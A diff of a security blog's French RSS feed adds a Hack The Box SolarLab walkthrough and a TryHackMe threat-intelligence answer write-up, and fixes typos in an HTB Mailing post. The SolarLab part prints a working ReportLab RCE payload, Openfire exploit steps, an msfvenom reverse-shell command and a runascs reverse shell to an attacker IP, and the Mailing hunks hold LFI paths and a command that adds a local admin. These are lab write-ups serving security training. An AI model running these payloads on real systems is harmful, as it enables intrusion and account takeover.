@@ -6,11 +6,272 @@
         <generator>Hugo -- gohugo.io</generator>
         <language>fr</language>
         <copyright>&lt;a href=&#34;https://creativecommons.org/licenses/by-nc/4.0/&#34; target=&#34;_blank&#34; rel=&#34;noopener&#34;&gt;CC BY-NC 4.0&lt;/a&gt;</copyright>
-        <lastBuildDate>Fri, 06 Sep 2024 23:42:37 -0500</lastBuildDate>
+        <lastBuildDate>Fri, 20 Sep 2024 13:33:36 -0500</lastBuildDate>
         <atom:link href="https://scorpiosec.com/fr/posts/index.xml" rel="self" type="application/rss+xml" />
         
         <item>
-            <title>HTB Mailing</title>
+            <title>HTB: SolarLab</title>
+            <link>https://scorpiosec.com/fr/posts/2024/09/htb-solarlab/</link>
+            <pubDate>Fri, 20 Sep 2024 13:33:36 -0500</pubDate>
+            
+            <guid>https://scorpiosec.com/fr/posts/2024/09/htb-solarlab/</guid>
+            <description>Platforme: Hack The Box Lien: SolarLab Niveau: Moyen OS: Windows SolarLab débute par un site web de base qui, après énumération, n&amp;rsquo;offre aucune voie d&amp;rsquo;exploitation directe. En se concentrant sur SMB, nous découvrons un document dans un partage de fichiers contenant des informations d&amp;rsquo;identification. Ces identifiants permettent d&amp;rsquo;accéder à ReportHub, accessible à partir d&amp;rsquo;un sous-domaine trouvé lors de l&amp;rsquo;énumération précédente. En examinant ses fonctionnalités, nous identifions qu&amp;rsquo;il génère des PDF en utilisant la bibliothèque ReportLab vulnérable (CVE-2023-33733), ce qui nous permet d&amp;rsquo;exploiter cela et d&amp;rsquo;obtenir un accès initial, en récupérant le drapeau de l&amp;rsquo;utilisateur.</description>
+            <content type="html"><![CDATA[<ul>
+<li>Platforme: Hack The Box</li>
+<li>Lien: <a href="https://app.hackthebox.com/machines/SolarLab" target="_blank" >SolarLab</a>
+
+</li>
+<li>Niveau: Moyen</li>
+<li>OS: Windows</li>
+</ul>
+<hr>
+<p>SolarLab débute par un site web de base qui, après énumération, n&rsquo;offre aucune voie d&rsquo;exploitation directe. En se concentrant sur SMB, nous découvrons un document dans un partage de fichiers contenant des informations d&rsquo;identification. Ces identifiants permettent d&rsquo;accéder à ReportHub, accessible à partir d&rsquo;un sous-domaine trouvé lors de l&rsquo;énumération précédente. En examinant ses fonctionnalités, nous identifions qu&rsquo;il génère des PDF en utilisant la bibliothèque ReportLab vulnérable (CVE-2023-33733), ce qui nous permet d&rsquo;exploiter cela et d&rsquo;obtenir un accès initial, en récupérant le drapeau de l&rsquo;utilisateur.</p>
+<p>Une exploration plus poussée révèle plusieurs services internes, y compris une console d&rsquo;administration Openfire accessible via un tunnel. En exploitant une vulnérabilité connue dans la version d&rsquo;Openfire (CVE-2023-32315), nous accédons à la console d&rsquo;administration et élevons les privilèges en téléchargeant un plugin malveillant couplé à une commande shell inversée. Enfin, en décryptant les informations d&rsquo;identification trouvées dans un fichier Openfire, nous obtenons un shell d&rsquo;administration et récupérons le drapeau root.</p>
+<p>Addresse IP cibe - <code>10.10.11.16</code></p>
+<h2 id="scanning">Scanning</h2>
+<pre tabindex="0"><code>nmap -sC -sV -oA nmap/SolarLab -p- 10.10.11.16
+</code></pre><p><strong>Results</strong></p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>Starting Nmap 7.94SVN <span style="color:#f92672">(</span> https://nmap.org <span style="color:#f92672">)</span> at 2024-09-20 13:32 CDT
+</span></span><span style="display:flex;"><span>Nmap scan report <span style="color:#66d9ef">for</span> 10.10.11.16
+</span></span><span style="display:flex;"><span>Host is up <span style="color:#f92672">(</span>0.052s latency<span style="color:#f92672">)</span>.
+</span></span><span style="display:flex;"><span>Not shown: <span style="color:#ae81ff">65530</span> filtered tcp ports <span style="color:#f92672">(</span>no-response<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>PORT     STATE SERVICE       VERSION
+</span></span><span style="display:flex;"><span>80/tcp   open  http          nginx 1.24.0
+</span></span><span style="display:flex;"><span>|_http-title: Did not follow redirect to http://solarlab.htb/
+</span></span><span style="display:flex;"><span>|_http-server-header: nginx/1.24.0
+</span></span><span style="display:flex;"><span>135/tcp  open  msrpc         Microsoft Windows RPC
+</span></span><span style="display:flex;"><span>139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
+</span></span><span style="display:flex;"><span>445/tcp  open  microsoft-ds?
+</span></span><span style="display:flex;"><span>6791/tcp open  http          nginx 1.24.0
+</span></span><span style="display:flex;"><span>|_http-server-header: nginx/1.24.0
+</span></span><span style="display:flex;"><span>|_http-title: Did not follow redirect to http://report.solarlab.htb:6791/
+</span></span><span style="display:flex;"><span>Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>Host script results:
+</span></span><span style="display:flex;"><span>| smb2-time: 
+</span></span><span style="display:flex;"><span>|   date: 2024-09-20T18:35:13
+</span></span><span style="display:flex;"><span>|_  start_date: N/A
+</span></span><span style="display:flex;"><span>| smb2-security-mode: 
+</span></span><span style="display:flex;"><span>|   3:1:1: 
+</span></span><span style="display:flex;"><span>|_    Message signing enabled but not required
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+</span></span><span style="display:flex;"><span>Nmap <span style="color:#66d9ef">done</span>: <span style="color:#ae81ff">1</span> IP address <span style="color:#f92672">(</span><span style="color:#ae81ff">1</span> host up<span style="color:#f92672">)</span> scanned in 176.37 seconds
+</span></span></code></pre></div><p>Ports discovered:</p>
+<ul>
+<li>80 - HTTP with Nginx 1.24.0 redirecting to <code>http://solarlab.htb/</code></li>
+<li>135 - RPC</li>
+<li>139 (NetBIOS) &amp; 445 (SMB)</li>
+<li>6791 - HTTP with nginx with a second redirection to <code>http://report.solarlab.htb:6791/</code></li>
+</ul>
+<p>We update the hosts file.</p>
+<pre tabindex="0"><code>sudo echo &#34;10.10.11.16 solarlab.htb report.solarlab.htb&#34; | sudo tee -a /etc/hosts
+</code></pre><h2 id="enumeration">Enumeration</h2>
+<p>The website features a messaging service that is supposed to be &ldquo;unhackable&rdquo;.</p>
+<p><img src="/images/HTB-SolarLab/solarlab-website.png" alt="SolarLab website"></p>
+<p>The source code of the webpage doesn&rsquo;t reveal anything useful.</p>
+<p>After enumerating SMB we find that we can read the <code>Documents</code> share.</p>
+<pre tabindex="0"><code>netexec smb 10.10.11.16 -u Guest -p &#34;&#34; --shares
+</code></pre><p><img src="/images/HTB-SolarLab/smb_enum.png" alt="SolarLab shares enumeration"></p>
+<p>We use smbclient to access the share and find four files, two right after accessing the share and two additional files in the <code>concepts</code> directory:</p>
+<ul>
+<li><code>details-file.xlsx</code></li>
+<li><code>old_leave_request_form.docx</code></li>
+<li><code>Training-Request-Form.docx</code></li>
+<li><code>Travel-Request-Sample.docx</code></li>
+</ul>
+<pre tabindex="0"><code>smbclient //10.10.11.16/Documents -U Guest
+</code></pre><p><img src="/images/HTB-SolarLab/share_files.png" alt="SolarLab shares files"></p>
+<p>We can download all the files with <code>get</code>.</p>
+<p><img src="/images/HTB-SolarLab/files-downloads.png" alt="SolarLab shares files download"></p>
+<p>After examining each document we find some credentials in <code>details-file.xlsx</code>.</p>
+<p><img src="/images/HTB-SolarLab/password-file.png" alt="Credentials found"></p>
+<p>So far the only way we can use those credentials is with SMB. It turns out that those credentials are valid but the available shares are still the same ones we could access with the guest account.</p>
+<pre tabindex="0"><code>netexec smb 10.10.11.16 -u KAlexander -p &#34;dkjafblkjadsfgl&#34;
+
+netexec smb 10.10.11.16 -u blake -p &#34;ThisCanB3typedeasily1@&#34;
+
+netexec smb 10.10.11.16 -u ClaudiaS -p &#34;dadsfawe9dafkn&#34;
+</code></pre><p><img src="/images/HTB-SolarLab/smb_logins.png" alt="SMB logins"></p>
+<p>Moving on, directory enumeration is also unfruitful.</p>
+<pre tabindex="0"><code>gobuster dir -u http://solarlab.htb/ -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt
+</code></pre><p><img src="/images/HTB-SolarLab/gobuster.png" alt="SolarLab directory bruteforcing"></p>
+<p>Let&rsquo;s check the second subdomain. When we go to <code>http://report.solarlab.htb:6791/</code> we find a login form for ReportHub.</p>
+<p><img src="/images/HTB-SolarLab/reporthub_solarlab.png" alt="SolarLab report subdomain"></p>
+<p>The only credentials we have so far are the ones from the password file, after several tries we are able to login with <code>blakeb:ThisCanB3typedeasily1@</code>.</p>
+<p><img src="/images/HTB-SolarLab/dashboard.png" alt="SolarLab Dashboard"></p>
+<p>We can choose which option we want, fill the form and get a pdf file. We can also upload a picture for the signature (which might be a way to exploit the target).</p>
+<p><img src="/images/HTB-SolarLab/Leave-Request-form.png" alt="Leave request form"></p>
+<p>Below is an example of the PDF generated.</p>
+<p><img src="/images/HTB-SolarLab/pdf-generated.png" alt="pdf generated"></p>
+<h2 id="initial-foothold">Initial Foothold</h2>
+<p>Using exiftool on the PDF generated we discover that it is produced by reportlab.</p>
+<pre tabindex="0"><code>exiftool output.pdf
+</code></pre><p><img src="/images/HTB-SolarLab/output_pdf.png" alt="exiftool results"></p>
+<p>We find a PoC for Reportlab (<a href="https://ethicalhacking.uk/cve-2023-33733-rce-in-reportlabs-html-parser/#gsc.tab=0" target="_blank" >CVE-2023-33733</a>
+
+) that leads to RCE <a href="https://github.com/c53elyas/CVE-2023-33733/tree/master" target="_blank" >here</a>
+
+.</p>
+<blockquote>
+<p>I used the <code>Travel Approval</code> option here but you can make the exploit work with the other options.</p>
+</blockquote>
+<p><img src="/images/HTB-SolarLab/Travel_Approval.png" alt="Travel Approval"></p>
+<p>After catching the request and sending it to the repeater with Burp. We insert our payload and make sure to match the <code>filename</code> value with the one for <code>Content-Type</code>.</p>
+<blockquote>
+<p>We get a reverse shell from <a href="https://www.revshells.com/" target="_blank" >revshells</a>
+
+ using the option <code>PowerShell #3 (Base64)</code>.</p>
+</blockquote>
+<p><img src="/images/HTB-SolarLab/payload-RCE.png" alt="ReportLab RCE"></p>
+<p><strong>Payload used</strong></p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-HTML" data-lang="HTML"><span style="display:flex;"><span>&lt;<span style="color:#f92672">para</span>&gt;&lt;<span style="color:#f92672">font</span> <span style="color:#a6e22e">color</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;[[[getattr(pow, Word(&#39;__globals__&#39;))[&#39;os&#39;].system(&#39;INSERT_REVSHELL_HERE&#39;) for Word in [ orgTypeFun( &#39;Word&#39;, (str,), { &#39;mutated&#39;: 1, &#39;startswith&#39;: lambda self, x: 1 == 0, &#39;__eq__&#39;: lambda self, x: self.mutate() and self.mutated &lt; 0 and str(self) == x, &#39;mutate&#39;: lambda self: { setattr(self, &#39;mutated&#39;, self.mutated - 1) }, &#39;__hash__&#39;: lambda self: hash(str(self)), }, ) ] ] for orgTypeFun in [type(type(1))] for none in [[].append(1)]]] and &#39;red&#39;&#34;</span>&gt;
+</span></span><span style="display:flex;"><span>                exploit
+</span></span><span style="display:flex;"><span>&lt;/<span style="color:#f92672">font</span>&gt;&lt;/<span style="color:#f92672">para</span>&gt;
+</span></span></code></pre></div><p>On our listener we get a shell as Blake and the user flag is found in the Desktop directory.</p>
+<p><img src="/images/HTB-SolarLab/user_flag.png" alt="User flag"></p>
+<h3 id="shell-as-openfire">Shell as openfire</h3>
+<p>There is a <code>openfire</code> user on the target.</p>
+<p><img src="/images/HTB-SolarLab/users_list.png" alt="User list"></p>
+<p>With <code>netstat -ano</code> we check all the services running on the target. In order to access the internal services we use tunneling.</p>
+<blockquote>
+<p>I personally prefer <a href="https://github.com/nicocha30/ligolo-ng" target="_blank" >ligolo-ng</a>
+
+ but you can also use chisel.</p>
+</blockquote>
+<p><img src="/images/HTB-SolarLab/netstat.png" alt="netstat command"></p>
+<p>After trying various ports we find an Openfire Administration Console on port 9090.</p>
+<p><img src="/images/HTB-SolarLab/Openfire-console.png" alt="Openfire admin console"></p>
+<p>This is the admin console, no credentials we have so far are working. I remember this version of Openfire being vulnerable to <a href="https://vulncheck.com/blog/openfire-cve-2023-32315" target="_blank" >CVE-2023-32315</a>
+
+ with a PoC being available <a href="https://github.com/miko550/CVE-2023-32315" target="_blank" >here</a>
+
+.</p>
+<blockquote>
+<p>This exploitation method was used for HTB: Jab, but we already had credentials back then</p>
+</blockquote>
+<ol>
+<li>We login with the newly created account</li>
+</ol>
+<pre tabindex="0"><code>python3 CVE-2023-32315.py -t http://240.0.0.1:9090
+</code></pre><p><img src="/images/HTB-SolarLab/openfire-new-account.png" alt="Openfire new account"></p>
+<p>Once logged in we need to upload a malicious plugin in the <code>Plugin</code> section. The malicious plugin is the <code>openfire-management-tool-plugin.jar</code> file available in the PoC repository.</p>
+<p><img src="/images/HTB-SolarLab/malicious-plugin.png" alt="Openfire malicious plugin"></p>
+<p>Go to <code>Server</code> &ndash;&gt; <code>Server Settings</code> &ndash;&gt; <code>Management Tool</code>, input the password <code>123</code> and click <code>Login</code>. You get some information about the server.</p>
+<p>Select <code>system command</code> in the drop-down menu.</p>
+<p><img src="/images/HTB-SolarLab/system_cmd.png" alt="Openfire system command"></p>
+<p>Get another Powershell base64 encoded reverse shell from <a href="https://www.revshells.com/" target="_blank" >revshells</a>
+
+ and execute it. On the listener we get a shell as <code>openfire</code>.</p>
+<p><img src="/images/HTB-SolarLab/execute-cmd.png" alt="Openfire execute command"></p>
+<p><img src="/images/HTB-SolarLab/openfire_shell.png" alt="Openfire shell"></p>
+<h2 id="privilege-escation-admin-shell">Privilege Escation (admin shell)</h2>
+<p>We still cannot find the root flag but after some system exploration we find a file called <code>openfire.script</code> in <code>C:\Program Files\Openfire\embedded-db</code>.</p>
+<p>The file contains the credentials of the admin user but the password needs to be decrypted. Forunately we have the password hash and the key.</p>
+<p><img src="/images/HTB-SolarLab/encrypted-pwd.png" alt="Openfire encrypted password"></p>
+<ul>
+<li>Password hash: <code>becb0c67cfec25aa266ae077e18177c5c3308e2255db062e4f0b77c577e159a11a94016d57ac62d4e89b2856b0289b365f3069802e59d442</code></li>
+<li>Key value: <code>hGXiFzsKaAeYLjn</code></li>
+</ul>
+<p>We can decrypt those with <a href="https://github.com/c0rdis/openfire_decrypt" target="_blank" >openfire_decrypt</a>
+
+ by using the command below.</p>
+<pre tabindex="0"><code>java OpenFireDecryptPass [PASSWORD_HASH] [KEY_VALUE]
+</code></pre><p><img src="/images/HTB-SolarLab/java-openfire-decrypt.png" alt="Openfire password decrytion"></p>
+<p>The credentials are: <code>admin:ThisPasswordShouldDo!@</code>.</p>
+<p>I tried to login with Evil-WinRM but it was not working so we resort to using RunasCs.</p>
+<pre tabindex="0"><code>msfvenom -p windows/x64/shell_reverse_tcp lhost=YOUR_IP lport=PORT_NUMBER -f exe -a x64 --platform windows -o shell.exe
+</code></pre><p>After sending both <code>shell.exe</code> and <code>RunasCs.exe</code> to the target, we run the command below.</p>
+<blockquote>
+<p>Setup a listener before running the runascs.exe command</p>
+</blockquote>
+<pre tabindex="0"><code>.\runascs.exe administrator ThisPasswordShouldDo!@ powershell -r 10.10.14.176:5555
+</code></pre><p><img src="/images/HTB-SolarLab/runascs_root.png" alt="runascs root command"></p>
+<p>On our listener we get a shell as administrator and we find the root flag in the Desktop directory.</p>
+<p><img src="/images/HTB-SolarLab/root_flag.png" alt="root shell &amp; root flag"></p>
+]]></content>
+        </item>
+        
+        <item>
+            <title>THM: Friday Overtime</title>
+            <link>https://scorpiosec.com/fr/posts/2024/09/thm-friday-overtime/</link>
+            <pubDate>Thu, 19 Sep 2024 21:09:28 -0500</pubDate>
+            
+            <guid>https://scorpiosec.com/fr/posts/2024/09/thm-friday-overtime/</guid>
+            <description>Platforme: TryHackMe Lien: Friday Overtime Niveau: Moyen Après avoir lancé la VM fournie, nous nous connectons avec les identifiants ericatracy:Intel321!.
+Who shared the malware samples? Immédiatement après notre identification, nous trouvons un document intitulé Urgent: Malicious Malware Artefacts Detected.
+L&amp;rsquo;auteur du document est Oliver Bennett.
+Réponse : Oliver Bennett
+What is the SHA1 hash of the file &amp;ldquo;pRsm.dll&amp;rdquo; inside samples.zip? Cliquez sur Documents puis sur View All.
+Après avoir sélectionné le document Urgent : Artefacts malveillants détectés, vous trouverez le fichier samples.</description>
+            <content type="html"><![CDATA[<ul>
+<li>Platforme: TryHackMe</li>
+<li>Lien: <a href="https://tryhackme.com/r/room/fridayovertime" target="_blank" >Friday Overtime</a>
+
+</li>
+<li>Niveau: Moyen</li>
+</ul>
+<hr>
+<p>Après avoir lancé la VM fournie, nous nous connectons avec les identifiants <code>ericatracy:Intel321!</code>.</p>
+<h2 id="who-shared-the-malware-samples">Who shared the malware samples?</h2>
+<p>Immédiatement après notre identification, nous trouvons un document intitulé <code>Urgent: Malicious Malware Artefacts Detected</code>.</p>
+<p><img src="/images/THM-Friday_Overtime/urgent_doc.png" alt="latest document"></p>
+<p>L&rsquo;auteur du document est <code>Oliver Bennett</code>.</p>
+<p><img src="/images/THM-Friday_Overtime/author.png" alt="document author"></p>
+<p><strong>Réponse</strong> : Oliver Bennett</p>
+<h2 id="what-is-the-sha1-hash-of-the-file-prsmdll-inside-sampleszip">What is the SHA1 hash of the file &ldquo;pRsm.dll&rdquo; inside samples.zip?</h2>
+<p>Cliquez sur <code>Documents</code> puis sur <code>View All</code>.</p>
+<p><img src="/images/THM-Friday_Overtime/view_all_docs.png" alt="View all documents"></p>
+<p>Après avoir sélectionné le document <code>Urgent : Artefacts malveillants détectés</code>, vous trouverez le fichier <code>samples.zip</code> sur le côté droit.</p>
+<p><img src="/images/THM-Friday_Overtime/samples_zip.png" alt="malware file"></p>
+<p>Téléchargez le fichier et extrayez-le, le mot de passe est <code>Panda321!</code>.</p>
+<p><img src="/images/THM-Friday_Overtime/unzip_samples_zip.png" alt="malware file extraction"></p>
+<p>Nous calculons ensuite le hash de <code>pRsm.dll</code>.</p>
+<pre tabindex="0"><code>sha1sum pRsm.dll
+</code></pre><p><img src="/images/THM-Friday_Overtime/sha1_hash.png" alt="sha1 hash"></p>
+<p>Réponse : <code>9d1ecbbe8637fed0d89fca1af35ea821277ad2e8</code></p>
+<h2 id="which-malware-framework-utilizes-these-dlls-as-add-on-modules">Which malware framework utilizes these DLLs as add-on modules?</h2>
+<p>Avec le hash sha256 du fichier <code>pRsm.dll</code>, nous effectuons une recherche sur VirusTotal.</p>
+<pre tabindex="0"><code>2c0cfe2f4f1e7539b4700e1205411ec084cbc574f9e4710ecd4733fbf0f8a7dc
+</code></pre><p><img src="/images/THM-Friday_Overtime/sha256_dll.png" alt="sha256 hash"></p>
+<p>Nous découvrons que le fichier est utilisé par des malwares de la famille MgBot.</p>
+<p><img src="/images/THM-Friday_Overtime/family_labels_VT.png" alt="VirusTotal family label"></p>
+<p>Réponse: <code>MgBot</code></p>
+<h2 id="which-mitre-attck-technique-is-linked-to-using-prsmdll-in-this-malware-framework">Which MITRE ATT&amp;CK Technique is linked to using pRsm.dll in this malware framework?</h2>
+<p>Une recherche google avec <code>MITRE ATT&amp;CK Technique pRsm.dll</code> nous amène à cet <a href="https://www.welivesecurity.com/2023/04/26/evasive-panda-apt-group-malware-updates-popular-chinese-software/" target="_blank" >article</a>
+
+.</p>
+<p><img src="/images/THM-Friday_Overtime/pRsm_search.png" alt="pRsm.dll MITRE ATT&amp;CK Technique"></p>
+<p>En recherchant <code>pRsm.dll</code> sur la page, nous trouvons que l&rsquo;ID de la technique est <a href="https://attack.mitre.org/versions/v12/techniques/T1123" target="_blank" >T1123</a>
+
+.</p>
+<p><img src="/images/THM-Friday_Overtime/technique_ID.png" alt="Technique ID"></p>
+<p>Réponse: <code>T1123</code></p>
+<h2 id="what-is-the-cyberchef-defanged-url-of-the-malicious-download-location-first-seen-on-2020-11-02">What is the CyberChef defanged URL of the malicious download location first seen on 2020-11-02?</h2>
+<p>Sur la même page, nous trouvons un lien <code>http://update.browser.qq[.]com/qmbs/QQ/QQUrlMgr_QQ88_4296.exe</code>.</p>
+<p><img src="/images/THM-Friday_Overtime/defanged_url.png" alt="url provided"></p>
+<p>Sur <a href="https://cyberchef.org/" target="_blank" >cyberchef.org</a>
+
+, nous utilisons la recette <code>defang URL</code> pour obtenir l&rsquo;URL valide.</p>
+<p><img src="/images/THM-Friday_Overtime/defanged_url2.png" alt="defanged url"></p>
+<p>Réponse: <code>hxxp[://]update[.]browser[.]qq[.]com/qmbs/QQ/QQUrlMgr_QQ88_4296[.]exe</code></p>
+<h2 id="what-is-the-cyberchef-defanged-ip-address-of-the-cc-server-first-detected-on-2020-09-14-using-these-modules">What is the CyberChef defanged IP address of the C&amp;C server first detected on 2020-09-14 using these modules?</h2>
+<p>Dans la section <code>Réseau</code>, nous trouvons une adresse IP pour la date spécifiée.</p>
+<p><img src="/images/THM-Friday_Overtime/IP_address.png" alt="IP address"></p>
+<p><img src="/images/THM-Friday_Overtime/defanged_IP.png" alt="Defanged IP address"></p>
+<p>Avec cyberchef, nous obtenons l&rsquo;adresse IP modifiée avec la recette <code>Defang IP addresses</code>.</p>
+<p>Réponse: <code>122[.]10[.]90[.]12</code></p>
+<h2 id="what-is-the-sha1-hash-of-the-spyagent-family-spyware-hosted-on-the-same-ip-targeting-android-devices-on-november-16-2022">What is the SHA1 hash of the spyagent family spyware hosted on the same IP targeting Android devices on November 16, 2022?</h2>
+<p>Sur VirusTotal, nous recherchons <code>122.10.90.12</code> et consultons la section <code>Relations</code>.</p>
+<p><img src="/images/THM-Friday_Overtime/android_spyware.png" alt="Communicated files"></p>
+<p>Nous recherchons ensuite <code>951F41930489A8BFE963FCED5D8DFD79</code> et sous <code>Details</code> nous trouvons le hash SHA1.</p>
+<p><img src="/images/THM-Friday_Overtime/sha1_android.png" alt="sha1 android file hash"></p>
+<p>Réponse: <code>1c1fe906e822012f6235fcc53f601d006d15d7be</code></p>
+]]></content>
+        </item>
+        
+        <item>
+            <title>HTB: Mailing</title>
             <link>https://scorpiosec.com/fr/posts/2024/09/htb-mailing/</link>
             <pubDate>Fri, 06 Sep 2024 23:42:37 -0500</pubDate>
             
@@ -105,14 +366,14 @@
 <p>L&rsquo;étape suivante sera d&rsquo;essayer de lire quelques fichiers sensibles. Nous savons que la cible utilise hmailserver donc nous nous concentrerons sur ce dernier, cherchons <code>hmailserver ini ile location</code> sur Google.</p>
 <p>Ce <a href="https://www.hmailserver.com/forum/viewtopic.php?t=29069" target="_blank" >post</a>
 
- nous dit que par défaut le fichier ini est dans <code>C:\NProgram Files\NMailServer\NBin</code> mais en utilisant <code>../../Program+Files/hMailServer/Bin/hMailServer.ini</code> pour le payload nous obtenons le résultat <code>File not found</code>.</p>
+ nous dit que par défaut le fichier ini est dans <code>C:\Program Files\MailServer\Bin</code> mais en utilisant <code>../../Program+Files/hMailServer/Bin/hMailServer.ini</code> pour le payload nous obtenons le résultat <code>File not found</code>.</p>
 <p>Ce <a href="%28https://www.hmailserver.com/forum/viewtopic.php?t=38903%29" >forum</a>
 
  nous apprend que le fichier ini peut également se trouver dans <code>program files (x86)\hMailServer\Bin\hMailServer.ini</code>.</p>
 <p>En utilisant le chemin <code>../../Program Files (x86)/hMailServer/Bin/hMailServer.ini</code> comme payload, nous parvenons à extraire des informations sensibles concernant le serveur de messagerie hMailServer en fonctionnement sur la machine cible.</p>
 <p><img src="/images/HTB-Mailing/INI-file.png" alt="LFI for hmailserver INI file"></p>
 <p><img src="/images/HTB-Mailing/INI-file-pwds.png" alt="INI file - passwords found"></p>
-<p>Le fichier contient deux hachages de mots de passe, le mot de passe administratif qui est <code>841bb5acfa6779ae432fd7a4e6600ba7</code> et un mot de passe utilisateur <code>0a9f8ad8bf896b501dde74f08efd7e4c</code>. Il révèle également les répertoires du logiciel et la base de données utilisée (MSSQL).</p>
+<p>Le fichier contient deux hachages de mots de passe, le mot de passe administrateur qui est <code>841bb5acfa6779ae432fd7a4e6600ba7</code> et un mot de passe utilisateur <code>0a9f8ad8bf896b501dde74f08efd7e4c</code>. Il révèle également les répertoires du logiciel et la base de données utilisée (MSSQL).</p>
 <p>À l&rsquo;aide de <a href="https://crackstation.net/" target="_blank" >CrackStation</a>
 
 , nous trouvons le mot de passe de l&rsquo;administrateur, <code>homenetworkingadministrator</code>.</p>
@@ -213,7 +474,7 @@ python3 CVE-2023-2255.py --cmd &#39;net localgroup Administradores maya /add&#39
 <pre tabindex="0"><code>cd &#39;Important Documents&#39;
 copy \\MY_IP\mailing\exploit.odt
 </code></pre><ol start="4">
-<li>Attendez 1 à 2 minutes puis confirmez que Maya fait maintenant partie du groupe <code>Administradores</code> avec <code>net user maya</code></li>
+<li>Attendre 1 à 2 minutes puis confirmez que Maya fait maintenant partie du groupe <code>Administradores</code> avec <code>net user maya</code></li>
 </ol>
 <p><img src="/images/HTB-Mailing/maya_admin.png" alt="maya now part of admin group"></p>
 <p>Déconnectez-vous d&rsquo;Evil-WinRM et reconnectez-vous pour que le privilège prenne effet. Vous pouvez maintenant accéder à <code>C:\Users\localadmin\Desktop</code> où vous trouverez le fichier <code>root.txt</code>.</p>
